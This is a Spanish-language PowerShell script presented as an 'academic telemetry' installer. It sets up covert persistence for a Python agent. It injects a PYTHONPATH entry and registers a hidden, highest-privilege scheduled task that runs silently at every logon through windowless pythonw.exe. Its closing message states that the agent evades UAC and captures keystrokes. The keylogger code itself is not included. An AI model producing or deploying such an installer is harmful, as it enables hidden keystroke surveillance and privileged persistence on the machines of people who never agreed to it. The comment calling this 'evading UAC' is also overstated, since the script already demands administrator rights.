# ==================================================
#  Instalador de Telemetría Académica (Windows)
# ==================================================

# 1. Comprobar si se está ejecutando como Administrador (Equivalente a sudo)
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Host "[!] Error: Este script requiere privilegios elevados." -ForegroundColor Red
    Write-Host "[*] Haz clic derecho en PowerShell y selecciona 'Ejecutar como administrador'." -ForegroundColor Yellow
    Exit
}

$UsuarioReal = $env:USERNAME
$DirActual = (Get-Item $PSScriptRoot).Parent.FullName
$DirGlobal = "$env:USERPROFILE\.telemetria_global"

# 2. Crear directorio seguro
Write-Host "[*] Creando directorio seguro en: $DirGlobal" -ForegroundColor Cyan
if (-not (Test-Path $DirGlobal)) {
    New-Item -ItemType Directory -Force -Path $DirGlobal | Out-Null
}

# 3. Inyectar PYTHONPATH a nivel de usuario (Equivalente al .bashrc)
Write-Host "[*] Inyectando variable de entorno PYTHONPATH..." -ForegroundColor Cyan
$CurrentPythonPath = [Environment]::GetEnvironmentVariable("PYTHONPATH", "User")
if ($CurrentPythonPath -notmatch [regex]::Escape($DirGlobal)) {
    $NewPythonPath = if ($CurrentPythonPath) { "$DirGlobal;$CurrentPythonPath" } else { $DirGlobal }
    [Environment]::SetEnvironmentVariable("PYTHONPATH", $NewPythonPath, "User")
    Write-Host "[OK] Puente inyectado automáticamente." -ForegroundColor Green
} else {
    Write-Host "[INFO] El puente ya estaba configurado." -ForegroundColor Yellow
}

# 4. Crear entorno virtual e instalar dependencias
Write-Host "[*] Creando entorno virtual aislado (venv)..." -ForegroundColor Cyan
# Usar el lanzador py para asegurar la version mas reciente (o forzar 3.14)
py -3.14 -m venv venv

if (Test-Path "requirements.txt") {
    Write-Host "[*] Instalando dependencias desde requirements.txt..." -ForegroundColor Cyan
    & "$DirActual\venv\Scripts\python.exe" -m pip install --upgrade pip | Out-Null
    & "$DirActual\venv\Scripts\pip.exe" install -r requirements.txt | Out-Null
    Write-Host "[OK] Dependencias instaladas." -ForegroundColor Green
}

# 5. Configurar persistencia (Equivalente a Systemd + Sudoers)
Write-Host "[*] Configurando persistencia profesional (Programador de Tareas)..." -ForegroundColor Cyan

$TaskName = "Agente_IntegriTI_$UsuarioReal"
$ScriptPython = "$DirActual\Client\client.py"
# Usamos pythonw.exe para que no se abra ninguna ventana negra (silencioso)
$PythonVenv = "$DirActual\venv\Scripts\pythonw.exe" 

# A) Definir la acción (Ejecutar el agente)
$Action = New-ScheduledTaskAction -Execute $PythonVenv -Argument "`"$ScriptPython`"" -WorkingDirectory "$DirActual\Client"

# B) Definir el gatillo (Al iniciar sesión este usuario)
$Trigger = New-ScheduledTaskTrigger -AtLogOn -User $UsuarioReal

# C) Definir los privilegios (RunLevel Highest = Evade UAC, no pide permisos y da acceso a root/admin)
$Principal = New-ScheduledTaskPrincipal -UserId $UsuarioReal -LogonType Interactive -RunLevel Highest

# D) Definir las configuraciones (Oculto, no detenerse si usa batería, reiniciar si falla)
$Settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit 0

# Eliminar tarea anterior si existe
Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue

# Registrar la nueva tarea
Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Principal $Principal -Settings $Settings -Force | Out-Null

# Iniciar la tarea inmediatamente
Start-ScheduledTask -TaskName $TaskName

Write-Host "[OK] Instalacion completada. Agente corriendo en segundo plano." -ForegroundColor Green
Write-Host "=================================================="
Write-Host " INSTALACION COMPLETADA CON EXITO."
Write-Host " El agente evadira el UAC y capturara teclas en Windows."
Write-Host "=================================================="
